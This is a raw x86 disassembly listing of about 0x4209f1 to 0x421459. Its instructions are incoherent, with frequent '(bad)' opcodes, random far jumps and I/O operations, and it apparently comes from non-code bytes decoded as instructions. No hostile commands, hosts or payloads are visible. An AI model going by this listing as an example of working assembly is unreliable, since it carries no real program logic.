  4209f1:	mov    al,0x20
  4209f3:	mov    dh,0x6
  4209f5:	jnp    0x420977
  4209f7:	idiv   DWORD PTR [ecx+0x18]
  4209fa:	jo     0x420989
  4209fc:	dec    ebx
  4209fd:	fistp  QWORD PTR [ebx]
  4209ff:	jg     0x4209c6
  420a01:	add    DWORD PTR [ecx+0x22],ebx
  420a04:	(bad)  
  420a05:	and    al,BYTE PTR [esp+eax*4+0x69]
  420a09:	pop    es
  420a0a:	aaa    
  420a0b:	sub    edx,esi
  420a0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a0e:	cmp    ah,ch
  420a10:	adc    edx,edi
  420a12:	pop    esi
  420a13:	lds    esi,FWORD PTR [ecx-0x51]
  420a16:	in     al,dx
  420a17:	push   ds
  420a18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a19:	xchg   esp,eax
  420a1a:	aas    
  420a1b:	xchg   esp,eax
  420a1c:	xchg   esp,ebx
  420a1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a1f:	arpl   WORD PTR [edx],sp
  420a21:	mov    eax,0x6fc9171a
  420a26:	outs   dx,BYTE PTR ds:[esi]
  420a27:	es (bad) 
  420a29:	sbb    eax,0xcdbfc454
  420a2e:	repnz sbb eax,0xb99194fb
  420a34:	add    DWORD PTR [eax],eax
	...
  420a96:	fbstp  TBYTE PTR [edx]
  420a98:	scas   eax,DWORD PTR es:[edi]
  420a99:	adc    ebp,edi
  420a9b:	lahf   
  420a9c:	(bad)  
  420a9d:	(bad)  
  420a9e:	(bad)  
  420aa0:	std    
  420aa1:	test   BYTE PTR [ecx-0x5a68b167],dh
  420aa7:	pop    edx
  420aa8:	add    DWORD PTR [eax],eax
  420aaa:	pop    es
  420aab:	add    DWORD PTR [eax],eax
  420aad:	add    BYTE PTR [edx+0x17],dl
  420ab0:	jo     0x420a67
  420ab2:	pushf  
  420ab3:	sub    DWORD PTR [ecx+0x7ed7be41],eax
  420ab9:	xchg   ecx,eax
  420aba:	ret    
  420abb:	add    BYTE PTR [esi+0x6a1671fe],0x16
  420ac2:	cwde   
  420ac3:	ror    BYTE PTR [bx-0x70a4],1
  420ac8:	inc    esp
  420ac9:	push   0x76d5065a
  420ace:	adc    DWORD PTR [edx-0x7ce2bbfb],0xffffff95
  420ad5:	test   al,0x53
  420ad7:	xchg   dh,dh
  420ad9:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  420adb:	mov    esp,0x52dfdd5c
  420ae0:	mov    ds:0xd5d14b03,eax
  420ae5:	fsub   st(0),st
  420ae7:	sub    edx,DWORD PTR [ebx]
  420ae9:	lock jmp DWORD PTR fs:[edi+0x23e36353]
  420af1:	jnp    0x420b21
  420af3:	nop
  420af4:	xor    ebx,esp
  420af6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420af7:	xor    eax,0x175fd9ea
  420afc:	or     bh,bh
  420afe:	je     0x420add
  420b00:	out    dx,eax
  420b01:	cmp    al,0xa2
  420b03:	sub    ebp,0x43
  420b06:	in     al,0x1b
  420b08:	gs inc esp
  420b0a:	mov    eax,ds:0xa8bbd56d
  420b0f:	mov    ss,WORD PTR [edx+0x49]
  420b12:	xor    ch,BYTE PTR [ebx]
  420b14:	xchg   esi,eax
  420b15:	xchg   esp,eax
  420b16:	push   ebx
  420b17:	xchg   ebx,eax
  420b18:	xor    DWORD PTR ds:0x323f3206,edi
  420b1e:	inc    edx
  420b1f:	stos   BYTE PTR es:[edi],al
  420b20:	pop    ebx
  420b21:	dec    edx
  420b22:	call   0x4515302c
  420b27:	pop    esp
  420b28:	and    cl,BYTE PTR [eax]
  420b2a:	push   es
  420b2b:	jno    0x420ab3
  420b2d:	cmp    eax,0xce2cdda9
  420b32:	sbb    BYTE PTR [ecx-0x5a],dh
  420b35:	jp     0x420b55
  420b37:	not    dl
  420b39:	add    dl,cl
  420b3b:	push   ds
  420b3c:	and    al,0x49
  420b3e:	mov    ds:0x90922e07,eax
  420b43:	sbb    edx,DWORD PTR [ebp-0x62524916]
  420b49:	jmp    0xfb61b618
  420b4e:	pop    ss
  420b4f:	fimul  WORD PTR [esi-0x27]
  420b52:	je     0x420b21
  420b54:	pop    esp
  420b55:	sub    BYTE PTR [esi],0xec
  420b58:	mov    ebp,0x6661ac0d
  420b5d:	(bad)  gs:[ebx-0x48]
  420b61:	fmul   DWORD PTR [ebp+0x2ad10df4]
  420b67:	jne    0x420b28
  420b69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b6a:	push   0x69439708
  420b6f:	xor    ebx,DWORD PTR [esi-0x69]
  420b72:	div    BYTE PTR [ebx-0xd]
  420b75:	nop
  420b76:	bound  edi,QWORD PTR [ebp+0x43]
  420b79:	push   edx
  420b7a:	(bad)  
  420b7b:	js     0x420b4a
  420b7d:	jmp    0x20e5:0xc5f5805
  420b84:	scas   eax,DWORD PTR es:[edi]
  420b85:	jo     0x420b2f
  420b87:	stos   DWORD PTR es:[edi],eax
  420b88:	fimul  DWORD PTR [eax+0x74477773]
  420b8e:	cmp    DWORD PTR [ebx+0x15819ac4],edx
  420b94:	loop   0x420b99
  420b96:	lods   eax,DWORD PTR ds:[esi]
  420b97:	aam    0x2c
  420b99:	int    0xf5
  420b9b:	es or  eax,0xbd4d8fc6
  420ba1:	or     cl,BYTE PTR [esp+ebx*2+0x6ca7e575]
  420ba8:	add    esp,ecx
  420baa:	ret    0x9728
  420bad:	pop    edi
  420bae:	inc    eax
  420baf:	mov    eax,ds:0x5007fba
  420bb4:	ins    DWORD PTR es:[edi],dx
	...
  420c15:	add    BYTE PTR [edx-0x604ef4eb],cl
  420c1b:	mov    edi,0x65553fba
  420c20:	pop    edx
  420c21:	stc    
  420c22:	dec    eax
  420c23:	mov    eax,DWORD PTR [eax+0x15bac4b]
  420c29:	add    BYTE PTR [edi],al
  420c2b:	add    DWORD PTR [eax],eax
  420c2d:	add    BYTE PTR [esi-0x21],bh
  420c30:	test   dl,0x23
  420c33:	data16 sbb BYTE PTR ds:[eax+0x29d56167],dl
  420c3b:	sahf   
  420c3c:	sub    BYTE PTR [ebx+0x1b],ah
  420c3f:	int    0x82
  420c41:	enter  0x533,0x7f
  420c45:	sbb    al,0xa7
  420c47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c48:	xchg   edi,eax
  420c49:	jns    0x420c14
  420c4b:	lods   al,BYTE PTR ds:[esi]
  420c4c:	pushf  
  420c4d:	and    DWORD PTR [ebp-0x1a4bc13f],eax
  420c53:	pop    ebp
  420c54:	popf   
  420c55:	sbb    al,0x6a
  420c57:	test   BYTE PTR fs:[eax+0x301fe7a4],bl
  420c5e:	xor    esi,edi
  420c60:	xchg   edi,eax
  420c61:	mov    esp,0x69afa507
  420c66:	add    eax,0xbfe99ef9
  420c6b:	jns    0x420c8d
  420c6d:	(bad)  
  420c6e:	or     cl,BYTE PTR [eax-0x8bee335]
  420c74:	stos   BYTE PTR es:[edi],al
  420c75:	cdq    
  420c76:	cli    
  420c77:	inc    ebp
  420c78:	adc    ah,BYTE PTR [esi]
  420c7a:	repz mov dl,BYTE PTR [ebx+0x72]
  420c7e:	or     BYTE PTR [ecx],bh
  420c80:	pop    esp
  420c81:	fmul   QWORD PTR [ecx+0x2b]
  420c84:	cmp    eax,0xc43312b3
  420c89:	jl     0x420cd4
  420c8b:	aas    
  420c8c:	imul   esi,DWORD PTR [esi+0x7d],0x658d6d31
  420c93:	xchg   ebx,eax
  420c94:	or     eax,0x6c96f62c
  420c99:	ins    DWORD PTR es:[edi],dx
  420c9a:	jle    0x420c51
  420c9c:	lahf   
  420c9d:	jle    0x420ca2
  420c9f:	cwde   
  420ca0:	jmp    0x91e1:0x8895a59f
  420ca7:	(bad)  
  420ca8:	sbb    bl,ch
  420caa:	inc    edi
  420cab:	gs mov ah,0x97
  420cae:	bsf    eax,DWORD PTR [ebx]
  420cb1:	push   esp
  420cb2:	stos   BYTE PTR es:[edi],al
  420cb3:	int3   
  420cb4:	inc    ecx
  420cb5:	fdivr  QWORD PTR [ebx+edi*2-0x1e0278ea]
  420cbc:	or     ebp,DWORD PTR [ecx+0x56]
  420cbf:	pop    ebp
  420cc0:	lods   eax,DWORD PTR ds:[esi]
  420cc1:	lock inc esi
  420cc3:	sbb    al,BYTE PTR [esi]
  420cc5:	(bad)  
  420cc7:	mov    ecx,ecx
  420cc9:	mov    ebp,0xceb90074
  420cce:	scas   eax,DWORD PTR es:[edi]
  420ccf:	xor    DWORD PTR [ecx+0x6b],0x5fb7f89e
  420cd6:	push   edx
  420cd7:	test   BYTE PTR [eax+0x25897329],ch
  420cdd:	pop    es
  420cde:	mov    ah,0x13
  420ce0:	or     edx,DWORD PTR [esi-0x7b]
  420ce3:	push   0x77c01a50
  420ce8:	pop    ebx
  420ce9:	mov    ds:0x9e5836ee,eax
  420cee:	push   0x4ddfb90d
  420cf3:	loope  0x420cdc
  420cf5:	imul   esp,DWORD PTR [edx],0x8f11e660
  420cfb:	dec    ebx
  420cfc:	push   ss
  420cfd:	mov    bh,0x5d
  420cff:	fdivr  st(1),st
  420d01:	(bad)  
  420d02:	jmp    0xc5c5dd9b
  420d07:	or     ebx,DWORD PTR es:[eax-0x653c2774]
  420d0e:	jbe    0x420d6f
  420d10:	mov    edi,0xc672a68
  420d15:	jge    0x420d27
  420d17:	cmp    BYTE PTR [esi+0x27],bh
  420d1a:	cs inc esi
  420d1c:	or     DWORD PTR [esi],edx
  420d1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d1f:	mov    eax,0xb6a3efd7
  420d24:	add    BYTE PTR [edx-0x3b6562c],cl
  420d2a:	and    al,0x7e
  420d2c:	jnp    0x420d94
  420d2e:	jae    0x420d6d
  420d30:	jo     0x420d34
  420d32:	(bad)  
  420d33:	cmc    
  420d34:	jno    0x420d36
	...
  420d96:	out    0x1e,eax
  420d98:	into   
  420d99:	push   0x9fe7f8ff
  420d9e:	mov    edi,0x4f0c1cea
  420da3:	and    bh,ah
  420da5:	pop    es
  420da6:	mov    bl,0x5c
  420da8:	add    DWORD PTR [eax],eax
  420daa:	pop    es
  420dab:	add    DWORD PTR [eax],eax
  420dad:	add    BYTE PTR [edx-0x3c5139bf],dl
  420db3:	xchg   ebp,eax
  420db4:	cld    
  420db5:	imul   esp,DWORD PTR [edi+0x5f],0x5
  420db9:	push   ebp
  420dba:	xchg   edi,eax
  420dbb:	jl     0x420da3
  420dbd:	jge    0x420dfe
  420dbf:	xchg   DWORD PTR [ebx],esi
  420dc1:	adc    BYTE PTR [eax+0x10b3a436],al
  420dc7:	rcl    ebp,1
  420dc9:	scas   eax,DWORD PTR es:[edi]
  420dca:	popf   
  420dcb:	inc    edi
  420dcc:	imul   esp,edi,0x3
  420dcf:	addr16 test al,0x47
  420dd2:	jb     0x420dd5
  420dd4:	ss nop
  420dd6:	dec    ebx
  420dd7:	or     BYTE PTR ds:0xf7d737f8,ah
  420ddd:	fs push ds
  420ddf:	lock and al,0x17
  420de2:	sbb    ecx,DWORD PTR [esi-0x2a]
  420de5:	scas   al,BYTE PTR es:[edi]
  420de6:	push   edi
  420de7:	or     al,0x38
  420de9:	mov    al,0x41
  420deb:	js     0x420e0e
  420ded:	dec    eax
  420dee:	add    DWORD PTR [edx],esp
  420df0:	ja     0x420dfb
  420df2:	sub    al,bh
  420df4:	push   ebx
  420df5:	ret    0x7b98
  420df8:	out    0xe7,eax
  420dfa:	into   
  420dfb:	rdtsc  
  420dfd:	push   ds
  420dfe:	and    al,0xd3
  420e00:	sub    al,bl
  420e02:	leave  
  420e03:	cmc    
  420e04:	pop    edi
  420e05:	iret   
  420e06:	jle    0x420db8
  420e08:	(bad)  
  420e0a:	pop    esi
  420e0b:	pop    ebx
  420e0c:	adc    ah,BYTE PTR [edx]
  420e0e:	cmc    
  420e0f:	sbb    edi,DWORD PTR [ecx+edi*4+0x1b7b3ef6]
  420e16:	ss enter 0xe74c,0x58
  420e1b:	sub    ebp,DWORD PTR [esi-0x4a]
  420e1e:	jnp    0x420e28
  420e20:	pop    esp
  420e21:	xlat   BYTE PTR ds:[ebx]
  420e22:	ins    DWORD PTR es:[edi],dx
  420e23:	xchg   ecx,eax
  420e24:	inc    bp
  420e26:	sbb    DWORD PTR [eax-0x3f],ebx
  420e29:	test   BYTE PTR [eax+0x28abca10],bh
  420e2f:	shl    DWORD PTR [ecx-0x7c],cl
  420e32:	rcl    DWORD PTR [edi-0x3d],1
  420e35:	cli    
  420e36:	dec    edx
  420e37:	icebp  
  420e38:	push   edi
  420e39:	ficomp DWORD PTR [esi+0xd]
  420e3c:	mov    cl,0xbf
  420e3e:	push   es
  420e3f:	inc    esp
  420e40:	add    esi,DWORD PTR [ebx+0x3693cd33]
  420e46:	push   edi
  420e47:	and    eax,0x33aa6268
  420e4c:	daa    
  420e4d:	mov    ebx,0x24af7624
  420e52:	or     edi,DWORD PTR [eax]
  420e54:	jnp    0x420de9
  420e56:	adc    eax,0xa1fd5047
  420e5b:	sub    DWORD PTR [edx+ebp*2+0x23],ebx
  420e5f:	scas   eax,DWORD PTR es:[edi]
  420e60:	and    bh,BYTE PTR [edx-0x333f69b8]
  420e66:	add    BYTE PTR [eax-0x52cfd747],bl
  420e6c:	clc    
  420e6d:	add    DWORD PTR [ebx+0x1799cfd8],ebx
  420e73:	add    al,0xcb
  420e75:	in     eax,0xee
  420e77:	repnz imul edi,DWORD PTR [edi],0xb3c3e192
  420e7e:	repnz cmp al,0xc1
  420e81:	or     eax,0x1a03e831
  420e86:	mov    dh,0x92
  420e88:	sbb    bl,dh
  420e8a:	fsub   st,st(7)
  420e8c:	addr16 int3 
  420e8e:	popf   
  420e8f:	push   edi
  420e90:	mov    ah,0xd2
  420e92:	or     edx,DWORD PTR [esi-0x5772e452]
  420e98:	sbb    BYTE PTR [edi+0x2266b055],dl
  420e9e:	mov    cl,0x8e
  420ea0:	fwait
  420ea1:	push   ss
  420ea2:	ds int3 
  420ea4:	aad    0x2c
  420ea6:	or     ecx,DWORD PTR [ecx]
  420ea8:	lea    ecx,ds:0x7255d3c6
  420eae:	adc    BYTE PTR ds:0x251203e7,bl
  420eb4:	jl     0x420eb6
	...
  420f16:	and    BYTE PTR [edi-0x28082cbe],dl
  420f1c:	mov    cl,0xf7
  420f1e:	sub    ch,0x3e
  420f21:	ds jnp 0x420f87
  420f24:	sub    al,0x48
  420f26:	mov    edx,0x700015d
  420f2b:	add    DWORD PTR [eax],eax
  420f2d:	add    dl,bh
  420f2f:	enter  0x4f46,0x59
  420f33:	xor    al,BYTE PTR [eax-0x69ea6e2e]
  420f39:	pop    edx
  420f3a:	iret   
  420f3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f3c:	stc    
  420f3d:	sbb    eax,0x18decc69
  420f42:	(bad)  
  420f43:	jnp    0x420f11
  420f45:	xor    BYTE PTR [esi+0x27acbc0a],ch
  420f4b:	out    0x49,eax
  420f4d:	jmp    0x859f8370
  420f52:	jne    0x420fa5
  420f54:	mov    ebp,0xd983ba7c
  420f59:	(bad)  [edx+0x659b3d4a]
  420f5f:	cmp    esi,DWORD PTR ds:0x2733b3c9
  420f65:	and    BYTE PTR [esp+eiz*4-0x57b88df8],al
  420f6c:	popf   
  420f6d:	xor    al,cl
  420f6f:	(bad)
  420f73:	shl    bl,0x54
  420f76:	imul   edx,DWORD PTR [eax-0x44929ff4],0x7e
  420f7d:	mov    WORD PTR [ecx+0x3cb260d0],cs
  420f83:	jmp    0x108d:0x7b9c7de3
  420f8a:	pop    edi
  420f8b:	push   cs
  420f8c:	(bad)  
  420f8d:	and    DWORD PTR ds:0x2c4a1f52,edi
  420f93:	or     al,0x28
  420f95:	sbb    BYTE PTR [ebp-0x4ec28cf4],bh
  420f9b:	and    al,0xc1
  420f9d:	mov    cl,bh
  420f9f:	test   BYTE PTR [esi+eax*4-0x1c4cba09],bh
  420fa6:	pop    esi
  420fa7:	retf   
  420fa8:	outs   dx,DWORD PTR ds:[esi]
  420fa9:	mov    bl,0xe5
  420fab:	test   eax,0x6c3c8acb
  420fb0:	loopne 0x420f48
  420fb2:	shl    dh,1
  420fb4:	jg     0x420f78
  420fb6:	sub    eax,0x71db600
  420fbb:	cs mov eax,0x47a426fa
  420fc1:	out    dx,eax
  420fc2:	into   
  420fc3:	lods   eax,DWORD PTR ds:[esi]
  420fc4:	(bad)  
  420fc6:	pusha  
  420fc7:	rdpmc  
  420fc9:	je     0x420f93
  420fcb:	call   0x59ce:0xf033e7de
  420fd2:	jmp    0x164161bc
  420fd7:	arpl   WORD PTR [edi+ebp*1],bx
  420fda:	inc    esi
  420fdb:	and    edx,edx
  420fdd:	and    al,0xd1
  420fdf:	aad    0xae
  420fe1:	mov    WORD PTR [eax-0xd],fs
  420fe4:	stc    
  420fe5:	and    al,BYTE PTR [esi+0x33]
  420fe8:	jl     0x420ff4
  420fea:	loop   0x420ffd
  420fec:	sbb    eax,0xc259c528
  420ff1:	push   es
  420ff2:	cmp    DWORD PTR [ebp-0x3e4be6b1],esp
  420ff8:	repnz and eax,0x4bb72a55
  420ffe:	aaa    
  420fff:	xchg   ebx,eax
  421000:	mov    ebp,0xe0440021
  421005:	sbb    eax,0xfdba1bf9
  42100a:	dec    BYTE PTR [edx]
  42100c:	(bad)  
  42100d:	ss pop ecx
  42100f:	mov    ds:0x7329e5cf,eax
  421014:	daa    
  421015:	mov    ds:0x7facf3a6,al
  42101a:	scas   eax,DWORD PTR es:[edi]
  42101b:	jmp    0xb4e3:0x570aba9a
  421022:	ror    dh,0x1d
  421025:	push   edi
  421026:	gs push es
  421028:	ja     0x421095
  42102a:	jl     0x420fd3
  42102c:	leave  
  42102d:	jmp    DWORD PTR [edi-0x10cd36f]
  421033:	xchg   edi,eax
  421034:	add    BYTE PTR [eax],0x0
	...
  421093:	add    BYTE PTR [eax],al
  421095:	add    BYTE PTR [edi-0x243925a2],bl
  42109b:	(bad)  
  42109c:	lahf   
  42109d:	pop    edi
  42109e:	retf   
  42109f:	inc    esi
  4210a0:	and    eax,0x86761ffe
  4210a5:	cld    
  4210a6:	rcr    DWORD PTR [esi+0x1],0x0
  4210aa:	pop    es
  4210ab:	add    DWORD PTR [eax],eax
  4210ad:	add    BYTE PTR [esi+ebx*8],bh
  4210b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210b1:	pop    es
  4210b2:	int3   
  4210b3:	inc    esp
  4210b4:	fdiv   st(1),st
  4210b6:	mov    esp,0xbfb41347
  4210bb:	out    0xab,eax
  4210bd:	xor    al,0xc9
  4210bf:	cmp    al,0x29
  4210c1:	aad    0x22
  4210c3:	sbb    BYTE PTR [edx],0xb0
  4210c6:	jecxz  0x4210cd
  4210c8:	push   esp
  4210c9:	xor    eax,0xee7f78e7
  4210ce:	mov    BYTE PTR [ebx],ch
  4210d0:	in     al,dx
  4210d1:	jmp    0x4210fe
  4210d3:	cld    
  4210d4:	push   ds
  4210d5:	ror    BYTE PTR [esi-0x602a5d69],0xdd
  4210dc:	(bad)  
  4210dd:	popa   
  4210de:	ss in  al,dx
  4210e0:	cdq    
  4210e1:	test   al,0xf8
  4210e3:	ja     0x42108a
  4210e5:	loop   0x4210e7
  4210e7:	jle    0x4210c2
  4210e9:	pop    es
  4210ea:	mov    cl,0xae
  4210ec:	push   ebp
  4210ed:	jecxz  0x42111f
  4210ef:	add    al,0x4d
  4210f1:	fs cli 
  4210f3:	movzx  ebp,WORD PTR [ecx-0x53]
  4210f7:	or     dh,dl
  4210f9:	jmp    0xcbf3:0xb67f5710
  421100:	in     al,dx
  421101:	push   edi
  421102:	lock jp 0x4210a3
  421105:	mov    esp,0xaf10c4fd
  42110a:	cmp    BYTE PTR [esi-0x63],al
  42110d:	out    0xa9,eax
  42110f:	mov    BYTE PTR [ebp-0x268806cf],bh
  421115:	mov    bl,0x1b
  421117:	add    ebx,DWORD PTR [ecx+0x79]
  42111a:	enter  0xf9fa,0x5
  42111e:	push   0xffffffab
  421120:	mov    DWORD PTR [edi],esp
  421122:	xchg   ebp,eax
  421123:	cmp    ah,ch
  421125:	shl    dl,1
  421127:	jecxz  0x421136
  421129:	push   cs
  42112a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42112b:	sub    DWORD PTR [ecx+0x37abf8b0],0xaa1091c0
  421135:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421136:	stc    
  421137:	mov    esi,0xcf8e02e9
  42113c:	sahf   
  42113d:	aam    0x6d
  42113f:	mov    ss,WORD PTR [ecx-0x41]
  421142:	ins    DWORD PTR es:[edi],dx
  421143:	fisttp QWORD PTR [edi+0x7d]
  421146:	ja     0x421138
  421148:	mov    ah,0xec
  42114a:	xor    esi,ebx
  42114c:	jb     0x421122
  42114e:	xor    edi,DWORD PTR [esp+ebx*8+0x5c]
  421152:	fwait
  421153:	xchg   ebp,eax
  421154:	jns    0x4210f6
  421156:	shr    BYTE PTR [edx+0x71],cl
  421159:	ins    BYTE PTR es:[edi],dx
  42115a:	ds adc ah,0xe1
  42115e:	pop    eax
  42115f:	fwait
  421160:	xchg   edi,eax
  421161:	jl     0x421187
  421163:	stos   DWORD PTR es:[edi],eax
  421164:	push   ebp
  421165:	cmp    eax,0x18add6e0
  42116a:	rol    BYTE PTR [esi],1
  42116c:	xor    dh,BYTE PTR [ecx]
  42116e:	mov    ebx,0x3a952fec
  421173:	jb     0x4211e3
  421175:	es inc ebp
  421177:	retf   0xaaf9
  42117a:	jmp    0x52265c2
  42117f:	paddd  mm4,QWORD PTR [ebx+ecx*8-0x23]
  421184:	dec    edi
  421185:	loopne 0x4211c3
  421187:	shr    eax,0x3c
  42118a:	retf   
  42118b:	dec    edx
  42118c:	clc    
  42118d:	into   
  42118e:	hlt    
  42118f:	ja     0x421205
  421191:	outs   dx,DWORD PTR ds:[esi]
  421192:	in     eax,0xd6
  421194:	arpl   WORD PTR [edx+eax*8],di
  421197:	cmp    BYTE PTR [eax+0x44],bh
  42119a:	fwait
  42119b:	and    BYTE PTR [edx],0x22
  42119e:	fwait
  42119f:	jmp    0x4211be
  4211a1:	frstor [ebx+0x3585fac0]
  4211a7:	mov    ds:0x8404994d,eax
  4211ac:	mov    bl,0x47
  4211ae:	pusha  
  4211af:	outs   dx,BYTE PTR ds:[esi]
  4211b0:	daa    
  4211b1:	jb     0x421215
  4211b3:	dec    esi
  4211b4:	nop
	...
  421215:	add    BYTE PTR [esi-0x700870e1],bl
  42121b:	idiv   esi
  42121d:	jg     0x421280
  42121f:	pop    es
  421220:	and    BYTE PTR [ecx+0x6],cl
  421223:	retf   0xdf10
  421226:	enter  0x15f,0x0
  42122a:	pop    es
  42122b:	add    DWORD PTR [eax],eax
  42122d:	add    BYTE PTR [esi+0x6f],ah
  421230:	mov    esp,DWORD PTR [ecx]
  421232:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421233:	jns    0x4211df
  421235:	mov    edi,0x9c451345
  42123a:	dec    ebp
  42123b:	sahf   
  42123c:	mov    edx,0xc29b553c
  421241:	shr    eax,1
  421243:	mov    al,ds:0xb86d046d
  421248:	sub    ebp,DWORD PTR [edi-0x28]
  42124b:	imul   ah
  42124d:	cli    
  42124e:	jmp    0x421237
  421250:	daa    
  421251:	and    al,0xad
  421253:	jno    0x42124c
  421255:	push   ds
  421256:	scas   al,BYTE PTR es:[edi]
  421257:	jg     0x421235
  421259:	push   es
  42125a:	cwde   
  42125b:	sti    
  42125c:	aaa    
  42125d:	pusha  
  42125e:	repz push eax
  421260:	push   edx
  421261:	cdq    
  421262:	es mov DWORD PTR cs:[edi],eax
  421266:	adc    al,0x1e
  421268:	and    BYTE PTR [ecx],0xd3
  42126b:	jp     0x4211f8
  42126d:	xchg   BYTE PTR [ebp+edx*4-0x5832959f],bl
  421274:	in     al,dx
  421275:	test   eax,0xf53c879c
  42127a:	in     eax,0x52
  42127c:	fs scas eax,DWORD PTR es:[edi]
  42127e:	push   ecx
  42127f:	push   ds
  421280:	inc    edi
  421281:	rcr    DWORD PTR [ebx],0xf1
  421284:	in     eax,0x2b
  421286:	arpl   ax,di
  421288:	push   edi
  421289:	push   eax
  42128a:	sub    BYTE PTR [ecx+0x1dcfeb86],cl
  421290:	(bad)  
  421291:	arpl   WORD PTR [edi+0x4f],sp
  421294:	jo     0x4212a5
  421296:	adc    eax,esp
  421298:	xchg   edi,eax
  421299:	cmp    BYTE PTR [ebp-0x16],0xfb
  42129d:	sbb    ebp,DWORD PTR [ebx+0x3715db7e]
  4212a3:	and    BYTE PTR [ebp+0x74a86851],bh
  4212a9:	retf   0x3c9f
  4212ac:	mov    ch,0xc
  4212ae:	pop    ss
  4212af:	mov    ch,0xbf
  4212b1:	shl    DWORD PTR [edx],1
  4212b3:	sti    
  4212b4:	xchg   BYTE PTR [edi-0x2a],bl
  4212b7:	sar    DWORD PTR [edi-0x2b532238],1
  4212bd:	add    DWORD PTR [edx],edi
  4212bf:	scas   al,BYTE PTR es:[edi]
  4212c0:	faddp  st(5),st
  4212c2:	and    BYTE PTR [eax-0x4c],0xbc
  4212c6:	mov    BYTE PTR [edx],dh
  4212c8:	sub    al,BYTE PTR [eax+0x176b9691]
  4212ce:	arpl   WORD PTR [eax+0x5498d372],cx
  4212d4:	xlat   BYTE PTR ds:[ebx]
  4212d5:	leave  
  4212d6:	sub    ecx,DWORD PTR ds:0x334f056e
  4212dc:	and    eax,0xbb508af7
  4212e1:	out    dx,al
  4212e2:	jle    0x4212ce
  4212e4:	scas   al,BYTE PTR es:[edi]
  4212e5:	daa    
  4212e6:	rol    DWORD PTR [ecx-0x43b8693b],cl
  4212ec:	and    BYTE PTR [edx+0x72],bl
  4212ef:	das    
  4212f0:	push   ss
  4212f1:	in     eax,dx
  4212f2:	mov    WORD PTR [ebx-0x6a8e7fd0],gs
  4212f8:	aaa    
  4212f9:	ret    
  4212fa:	aam    0x48
  4212fc:	xor    edi,DWORD PTR [eax+0x4db7548c]
  421302:	add    DWORD PTR [eax+0x6ab07cfc],edi
  421308:	jnp    0x42137b
  42130a:	sbb    DWORD PTR [edx-0x73719287],eax
  421310:	cli    
  421311:	adc    BYTE PTR [edx-0x3c],al
  421314:	imul   ebx,DWORD PTR [edx+eax*1],0x4b
  421318:	fimul  WORD PTR [edi]
  42131a:	dec    ebx
  42131b:	pop    es
  42131c:	mov    ss,WORD PTR [ebx+0x53]
  42131f:	or     BYTE PTR [eax],dl
  421321:	(bad)  
  421322:	ftst   
  421324:	in     al,dx
  421325:	retf   0xe721
  421328:	iret   
  421329:	xor    BYTE PTR [ebx-0x3e2dcbe],0x4
  421330:	xor    esi,esi
  421332:	lods   al,BYTE PTR ds:[esi]
  421333:	add    esp,DWORD PTR [edx+0x0]
	...
  421395:	add    dh,bh
  421397:	(bad)  
  421398:	pop    esp
  421399:	mov    eax,ds:0xdfffbb7d
  42139e:	mov    eax,ds:0xd96c04b0
  4213a3:	fist   WORD PTR [ecx]
  4213a5:	test   bh,cl
  4213a7:	pusha  
  4213a8:	add    DWORD PTR [eax],eax
  4213aa:	pop    es
  4213ab:	add    DWORD PTR [eax],eax
  4213ad:	add    BYTE PTR [ebx-0x1a],dl
  4213b0:	dec    esp
  4213b1:	pop    ecx
  4213b2:	les    eax,FWORD PTR [esi+eiz*1]
  4213b5:	sbb    al,0xe0
  4213b7:	mov    esp,0xc6156777
  4213bc:	push   esi
  4213bd:	mov    esp,0xa4247c5
  4213c2:	aad    0xa5
  4213c4:	stos   DWORD PTR es:[edi],eax
  4213c5:	lds    esi,FWORD PTR [edi+0x38]
  4213c8:	mov    ch,0x24
  4213ca:	sbb    BYTE PTR [eax+ecx*4+0x38eb805c],bh
  4213d1:	cld    
  4213d2:	jge    0x421439
  4213d4:	xor    eax,0xf240db43
  4213d9:	ss sub al,0xab
  4213dc:	pop    es
  4213dd:	adc    al,0x9c
  4213df:	outs   dx,BYTE PTR ds:[esi]
  4213e0:	shl    BYTE PTR [esi-0x4cb3ff71],1
  4213e6:	out    dx,al
  4213e7:	rcl    BYTE PTR [ebp+0x13],cl
  4213ea:	addr16 adc ch,0x8d
  4213ee:	inc    esi
  4213ef:	jne    0x4213f8
  4213f1:	xor    ah,bh
  4213f3:	mov    esp,0x3518f14f
  4213f8:	fld    QWORD PTR [esi]
  4213fa:	inc    eax
  4213fb:	add    DWORD PTR [edi-0x5c86827f],edi
  421401:	push   ss
  421402:	and    DWORD PTR [esi],ecx
  421404:	jmp    0x4213f0
  421406:	in     al,0x3
  421408:	pop    edx
  421409:	repz xlat BYTE PTR ds:[ebx]
  42140b:	repz add BYTE PTR [ecx],bl
  42140e:	ins    DWORD PTR es:[edi],dx
  42140f:	adc    eax,0x1907ff38
  421414:	and    BYTE PTR [edi],dh
  421416:	adc    al,0x4e
  421418:	cmp    BYTE PTR [ebp-0x54c7b4f2],bl
  42141e:	dec    ecx
  42141f:	xor    ebx,ecx
  421421:	pop    es
  421422:	adc    eax,0x3c2ee3dd
  421427:	(bad)  
  421428:	inc    eax
  421429:	inc    ebp
  42142a:	mov    ebp,DWORD PTR [edi+0x25656687]
  421430:	xchg   ecx,eax
  421431:	loopne 0x4214a3
  421433:	lods   eax,DWORD PTR ds:[esi]
  421434:	into   
  421435:	sahf   
  421436:	pop    esp
  421437:	and    al,0x94
  421439:	jbe    0x421401
  42143b:	mov    esi,0x9f05517
  421440:	shr    BYTE PTR [esi-0x527770d8],cl
  421446:	push   ds
  421447:	jecxz  0x4213e3
  421449:	sub    WORD PTR [ecx+0x7],sp
  42144d:	mov    eax,0xe0f95824
  421452:	mov    ds:0x473dc016,al
  421457:	jbe    0x421481
  421459:	dec    edx
